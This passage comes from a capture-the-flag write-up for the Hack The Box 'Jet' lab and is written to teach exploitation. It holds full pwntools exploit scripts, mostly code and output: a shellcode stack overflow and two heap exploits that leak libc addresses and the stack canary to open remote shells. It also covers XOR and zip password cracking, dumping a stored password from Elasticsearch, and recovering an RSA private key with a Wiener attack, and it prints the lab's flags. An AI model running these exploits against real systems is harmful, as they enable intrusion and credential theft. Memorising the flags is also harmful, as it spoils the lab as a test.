Finally we can write our script
```
#!/usr/bin/python3
from pwn import remote, p64

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  

offset = 72
junk = b"A" * (offset - len(shellcode))

shell = remote("10.13.37.10", 9999)
shell.recvuntil(b"Oops, I'm leaking! ")

ret = p64(int(shell.recvuntil(b"\n"),16))

payload = shellcode + junk + ret  

shell.sendlineafter(b"> ", payload)
shell.interactive()
```

To be able to run the exploit from our machine we will use `socat` so that the program runs and we can access it from port 9999
```
www-data@jet:~$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &  
[1] 7321
www-data@jet:~$
```

After run it we can get the shell as `alex`
```
python3 exploit.py 
[+] Opening connection to 10.13.37.10 on port 9999: Done  
[*] Switching to interactive mode
$ whoami
alex
$
```

# Crack the secret message
There are three other files in the home directory of `alex`
```
alex@jet:~$ ls -l
-rw-r--r-- 1 root root  659 Jan  3  2018 crypter.py
-rw-r--r-- 1 root root 1481 Dec 28  2017 encrypted.txt
-rw-r--r-- 1 root root 7285 Dec 27  2017 exploitme.zip  
-rw-r--r-- 1 root root   27 Dec 28  2017 flag.txt
```

we can download them to our local machine.
```
cat crypter.py
import binascii
def makeList(stringVal):
    list = []
    for c in stringVal:
        list.append(c)
return list
def superCrypt(stringVal,keyVal):
    keyPos = 0
    key = makeList(keyVal)
    xored = []
    for c in stringVal:
        xored.append(binascii.hexlify(chr(ord(c) ^ ord(keyVal[keyPos]))))
        if keyPos == len(key) - 1:
            keyPos = 0
        else:
            keyPos += 1
    hexVal = ''
    for n in xored:
        hexVal += n
    return hexVal
with open('message.txt') as f:
    content = f.read()
key = sys.argv[1]
with open('encrypted.txt', 'w') as f:
    output = f.write(binascii.unhexlify(superCrypt(content, key)))
```
This script takes `message.txt` and xor it with the password we don't know as the key, then save it in a file called `encrypted.txt`

When we want to unzip the `exploitme.zip`, it needs the password here.
```
❯ unzip exploitme.zip 
Archive:  exploitme.zip
[exploitme.zip] membermanager password:  
```

In this place, we can use `https://github.com/nccgroup/featherduster` this tool to help us get the secret of messages
```
python3 xorcrack.py
Hello mate!

First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!

Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
Make sure those binaries are kept safe!

To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.

The ports are 5555 and 7777.
Have fun and keep it safe!

JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}


Cheers - Alex

-----------------------------------------------------------------------------
This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.  
-----------------------------------------------------------------------------
```

For the protected zip file, we can use `zip2john` to help us get cracked that
```
zip2john exploitme.zip > hash  

john -w:keys.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
securewebincrocks (exploitme.zip)
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

Then we can unzip that and get 2 executable files
```
❯ unzip exploitme.zip
Archive:  exploitme.zip
[exploitme.zip] membermanager password: securewebincrocks  
  inflating: membermanager           
  inflating: memo

❯ ls
membermanager  memo
```

# Elasticsearch
Let's come back to the `alex`shell, I would check the `netstat`
```
alex@jet:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7777            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 10.13.37.10:9201        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN     
tcp        0      0 10.13.37.10:53          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN     
tcp        0      0 10.13.37.10:7777        10.10.14.6:58150        ESTABLISHED
tcp        0      0 10.13.37.10:5555        10.10.14.6:53574        ESTABLISHED
tcp        0     51 10.13.37.10:47268       10.10.14.11:4444        ESTABLISHED
tcp        0    244 10.13.37.10:22          10.10.14.19:51638       ESTABLISHED  
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:953                 :::*                    LISTEN     
tcp6       0      0 127.0.0.1:9200          :::*                    LISTEN     
tcp6       0      0 127.0.0.1:9300          :::*                    LISTEN     
tcp6       0      0 :::53                   :::*                    LISTEN     
alex@jet:~$
```

To access it from the outside, we will use `socat` again to redirect the content it receives from port 8080 to port 9300 where `elasticsearch` is running.
```
alex@jet:~$ socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9300 &  
[1] 62178
alex@jet:~$
```

Using java, we can connect to the `elasticsearch` cluster
We need to create a `transporte` object, connect to the machine via port 8080, and perform a simple search using the test index.
```
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.util.Map;

import org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;
import org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;
import org.elasticsearch.action.admin.indices.get.GetIndexResponse;
import org.elasticsearch.action.admin.indices.get.GetIndexRequest;
import org.elasticsearch.transport.client.PreBuiltTransportClient;
import org.elasticsearch.cluster.health.ClusterIndexHealth;
import org.elasticsearch.common.transport.TransportAddress;
import org.elasticsearch.client.transport.TransportClient;
import org.elasticsearch.action.search.SearchResponse;
import org.elasticsearch.client.IndicesAdminClient;
import org.elasticsearch.common.settings.Settings;
import org.elasticsearch.search.SearchHit;
import org.elasticsearch.client.Client;

public class Program {
    public static void main(String[] args) {
        byte[] ipAddr = new byte[]{10, 13, 37, 10};
        Client client = new PreBuiltTransportClient(Settings.EMPTY)
            .addTransportAddress(new TransportAddress(new InetSocketAddress("10.13.37.10", 8080)));  
        System.out.println(client.toString());
        ClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();
        for (ClusterIndexHealth health : healths.getIndices().values()) {
            String index = health.getIndex();
            System.out.println(index);
        }
        SearchResponse searchResponse = client.prepareSearch("test").execute().actionGet();
        SearchHit[] results = searchResponse.getHits().getHits();
        for(SearchHit hit : results){
            String sourceAsString = hit.getSourceAsString();
            System.out.println(sourceAsString);
        }
        client.close();
    }
}
```

Then let's run it and find what we need here
```
java -cp ".:/usr/share/elasticsearch/lib/*" Program | jq

{
  "timestamp": "2017-11-13 08:31",
  "subject": "Just a heads up Rob",
  "category": "admin",
  "draft": "no",
  "body": "Hey Rob - just so you know, that information you wanted has beensent."
}
{
  "timestamp": "2017-11-10 07:00",
  "subject": "Maintenance",
  "category": "maintenance",
  "draft": "no",
  "body": "Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday"
}
{
  "timestamp": "2017-11-13 08:30",
  "subject": "Details for upgrades to EU-API-7",
  "category": "admin",
  "draft": "yes",
  "body": "Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don _NOT_ tell _ANYONE_. We need a better way of sharing secrets. The password is purpl3un1c0rn_1969. -Jason JET{3sc4p3_s3qu3nc3s_4r3_fun}"  
}
{
  "timestamp": "2017-11-13 13:32",
  "subject": "Upgrades complete",
  "category": "Maintenance",
  "draft": "no",
  "body": "All upgrades are complete, and normal service resumed"
}
{
  "timestamp": "2017-11-09 15:13",
  "subject": "Server outage",
  "category": "outage",
  "draft": "no",
  "body": "Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed"
}
{
  "timestamp": "2017-11-13 13:40",
  "subject": "Thanks Jazz",
  "category": "admin",
  "draft": "no",
  "body": "Thanks dude - all done. You can delete our little secret. Kind regards, Rob"
}
{
  "timestamp": "2017-11-13 08:27",
  "subject": "Upgrades",
  "category": "maintenance",
  "draft": "no",
  "body": "An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances"
}
```

# Crack membermanager
When we try to run the executable file `membermanager`, we can found it's same as the service of port 5555
```
./membermanager  
enter your name:
test
Member manager!
1. add
2. edit
3. ban
4. change name
5. get gift
6. exit

netcat 10.13.37.10 5555  
enter your name:
test
Member manager!
1. add
2. edit
3. ban
4. change name
5. get gift
6. exit
```

This is a heap challenge from `0x00ctf 2017`. Please refer to the blog.
```
https://poning.me/2017/03/24/baby-heap-2017/
```

We can get the solved script here
```
#!/usr/bin/python3
from pwn import remote, p64, p16

shell = remote("10.13.37.10", 5555)

def add(size, data):
    shell.sendlineafter(b"6. exit", b"1")
    shell.sendlineafter(b"size:", str(size).encode())
    shell.sendlineafter(b"username:", data)

def edit(idx, mode, data):
    shell.sendline(b"2")
    shell.sendlineafter(b"2. insecure edit", str(mode).encode())  
    shell.sendlineafter(b"index:", str(idx).encode())
    shell.sendlineafter(b"username:", data)
    shell.recvuntil(b"6. exit")

def ban(idx):
    shell.sendline(b"3")
    shell.sendlineafter(b"index:", str(idx).encode())
    shell.recvuntil(b"6. exit")

def change(data):
    shell.sendline(b"4")
    shell.sendlineafter(b"name:", data)
    shell.recvuntil(b"6. exit")

shell.sendlineafter(b"name:", b"A" * 8)

add(0x88, b"A" * 0x88)
add(0x100, b"A" * 8)

payload  = b"A" * 0x160
payload += p64(0)
payload += p64(0x21)

add(0x500, payload)
add(0x88, b"A" * 8)

shell.recv()
ban(2)

payload  = b""
payload += b"A" * 0x88
payload += p16(0x281)

edit(0, 2, payload)

shell.recv()
shell.sendline(b"5")
shell.recvline()

leak_read = int(shell.recvline()[:-1], 10)
libc_base = leak_read - 0xf7250

payload  = b""
payload += p64(0) * 3
payload += p64(libc_base + 0x45390)

change(payload)

payload  = b""
payload += b"A" * 256
payload += b"/bin/sh\x00"
payload += p64(0x61)
payload += p64(0)
payload += p64(libc_base + 0x3c5520 - 0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(0x6020a0)

edit(1, 1, payload)

shell.sendline(b"1")
shell.sendlineafter(b"size:", str(0x80).encode())
shell.recvuntil(b"[vsyscall]")
shell.recvline()
shell.interactive()
```

When we run the exploited script, we can get the shell as `membermanager`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Jet]
└─$ python3 baby_heap.py     
[+] Opening connection to 10.13.37.10 on port 5555: Done
[*] Switching to interactive mode
$ id
uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)
$ whoami
membermanager

```

To get a more stable shell, I would write my `id_rsa.pub` into the `~/.ssh`, then we can use ssh to connect it.
```
ssh membermanager@10.13.37.10
membermanager@jet:~$ id
uid=1006(membermanager) gid=1006(membermanager) groups=1006(membermanager)  
membermanager@jet:~$ hostname -I
10.13.37.10
membermanager@jet:~$
```

# Crack the secret of Tony
We can access to `tony`'s home directory and we can find some files
```
membermanager@jet:/home/tony$ ls -al *
-rw-r--r-- 1 root root  129 Dec 28  2017 key.bin.enc  
-rw-r--r-- 1 root root 4768 Dec 28  2017 secret.enc
-rw-r--r-- 1 root root 451 Dec 28  2017 public.crt
```
Let's download them to our local machine and check them
```
cat public.crt
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQGN24SSfsyl/rFafZuCr54a
BqEpk9fJDFa78Qnk177LTPwWgJPdgY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmB
jQh7jykg7N4FUC5dkqx4gBw+dfDfytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQop
lt34bxbXgVvJZUMfBFC6LQKBgQCkzWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl
2M6sE8sHiedfyQ4Hvro2yfkrMObcEZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw
2lpm81KVmMIG0oEHy9V8RviVOGRWi2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAML  
UCV4ew==
-----END PUBLIC KEY-----
```

Using `RsaCtfTool`, we can automatically get the result by passing the public key and wiener type attack.
```
RsaCtfTool --publickey public.crt --private --attack wiener

[*] Testing key public.crt.
[*] Performing wiener attack on public.crt.
 25%|██████████▊                                | 154/612 [36628.83it/s]  
[*] Attack success with wiener method !

Results for public.crt:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
-----END RSA PRIVATE KEY-----
```

Save the key in a file called `private.crt` and use `openssl` to `decrypt` the key.bin.enc file which can be used as a password
```
openssl pkeyutl -decrypt -inkey private.crt -in key.bin.enc -out file  
```

Then we can decode the `secret.enc` file and see the flag in the message
```
openssl aes-256-cbc -d -in secret.enc -pass file:file

 ▄▄▄██▀▀▀▓█████▄▄▄█████▓      ▄████▄   ▒█████   ███▄ ▄███▓                                                                                                   
   ▒██   ▓█   ▀▓  ██▒ ▓▒     ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒    Congratulations!!                                                           
   ░██   ▒███  ▒ ▓██░ ▒░     ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░                                                                                      
▓██▄██▓  ▒▓█  ▄░ ▓██▓ ░      ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██     Jet: https://jet.com/careers                                                           
 ▓███▒   ░▒████▒ ▒██▒ ░  ██▓ ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒    HTB: https://www.hackthebox.eu                                                     
 ▒▓▒▒░   ░░ ▒░ ░ ▒ ░░    ▒▓▒ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░                                                                                                     
 ▒ ░▒░    ░ ░  ░   ░     ░▒    ░  ▒     ░ ▒ ▒░ ░  ░      ░    JET{n3xt_t1m3_p1ck_65537}                                                              
 ░ ░ ░      ░    ░       ░   ░        ░ ░ ░ ▒  ░      ░                                                                                                        
 ░   ░      ░  ░          ░  ░ ░          ░ ░         ░                                                                                                        
                          ░  ░                                                                                                                                 
                                  Props to:           ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄█████▓ ██░ ██ ▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒     ▓█████  █    ██ 
                                                      ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░     ▓█   ▀  ██  ▓██▒
                                      blink (jet)     ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░     ▒███   ▓██  ▒██░  
                                      g0blin (htb)    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒      ▒▓█  ▄ ▓▓█  ░██░
                                      forGP (htb)     ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄  ▒██▒ ░ ░▓█▒░██▓░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒ ██▓ ░▒████▒▒▒█████▓ 
                                      ch4p (htb)       ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ░░ ▒░ ░░▒▓▒ ▒ ▒ 
                                      xero (0x00sec)   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░     ▒ ░▒░ ░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░ ░▒   ░ ░  ░░░▒░ ░ ░ 
                                                       ░  ░░ ░  ░   ▒   ░        ░ ░░ ░   ░       ░  ░░ ░   ░    ░    ░ ░ ░ ░ ▒   ░    ░   ░      ░    ░░░ ░ ░ 
                                                       ░  ░  ░      ░  ░░ ░      ░  ░             ░  ░  ░   ░  ░ ░          ░ ░   ░    ░    ░     ░  ░   ░     
                                                                        ░                                             ░                     ░                 
```

# Crack Memo
This program is the same as the port 7777 service
```
./memo

--==[[ Spiritual Memo ]]==--  

[1] Create a memo
[2] Show memo
[3] Delete memo
[4] Tap out
>

netcat 10.13.37.10 7777  

--==[[ Spiritual Memo ]]==--

[1] Create a memo
[2] Show memo
[3] Delete memo
[4] Tap out
>
```

Another long `ctf` heap overflow challenge
```
#!/usr/bin/python3
from pwn import remote, p64, u64

shell = remote("10.13.37.10", 7777)

def create_memo(data, answer, more):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"Data: ", data)
    if answer[:3] == "yes":
        shell.sendafter(b"[yes/no] ", answer.encode())
    else:
        shell.sendafter(b"[yes/no] ", answer)
        shell.sendafter(b"Data: ", more)

def show_memo():
    shell.sendlineafter(b"> ", b"2")
    shell.recvuntil(b"Data: ")

def delete_memo():
    shell.sendlineafter(b"> ", b"3")

def tap_out(answer):
    shell.sendlineafter(b"> ", b"4")
    shell.sendafter(b"[yes/no] ", answer)

create_memo(b"A" * 0x1f, b"no", b"A" * 0x1f)
show_memo()
shell.recv(0x20)

stack_chunk = u64(shell.recv(6) + b"\x00" * 2) - 0x110

delete_memo()
create_memo(b"A" * 0x28, b"no", b"A" * 0x28)
show_memo()
shell.recvuntil(b"A" * 0x28)
shell.recv(1)

canary = u64(b"\x00" + shell.recv(7))

create_memo(b"A" * 0x18, b"no", b"A" * 0x18)
create_memo(b"A" * 0x18, b"no", b"A" * 0x17)
show_memo()
shell.recvuntil(b"A" * 0x18)
shell.recv(1)

heap = u64(b"\x00" + shell.recv(3).ljust(7, b"\x00"))

create_memo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)

tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xe0))
delete_memo()
tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xc0))
delete_memo()
show_memo()

leak = u64(shell.recv(6).ljust(8, b"\x00"))
libc = leak - 0x3c4b78

create_memo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(stack_chunk))
create_memo(p64(leak) * (0x28 // 8), b"no", b"A" * 0x28)
create_memo(b"A" * 0x8 + p64(0x21) + p64(stack_chunk + 0x18) + b"A" * 0x8 + p64(0x21), "yes", b"")  
create_memo(b"A" * 0x8, b"no", p64(canary) + b"A" * 0x8 + p64(libc + 0x45216))

tap_out(b"yes\x00")

shell.recvline()
shell.interactive()
```

Then you can get the shell as `memo`
```
python3 memo.py
[+] Opening connection to 10.13.37.10 on port 7777: Done
[*] Switching to interactive mode
$ id
uid=1007(memo) gid=1007(memo) groups=1007(memo)
$ hostname -I
10.13.37.10 
$ cd /home/memo
$ ls
flag.txt
memo
$ cat flag.txt
Congrats! JET{7h47s_7h3_sp1r17}
```

# Description

I thought this machine was about the part that is more relevant to real life and business, but it is actually a pure CTF environment. If you are really interested in CTF, this is for you.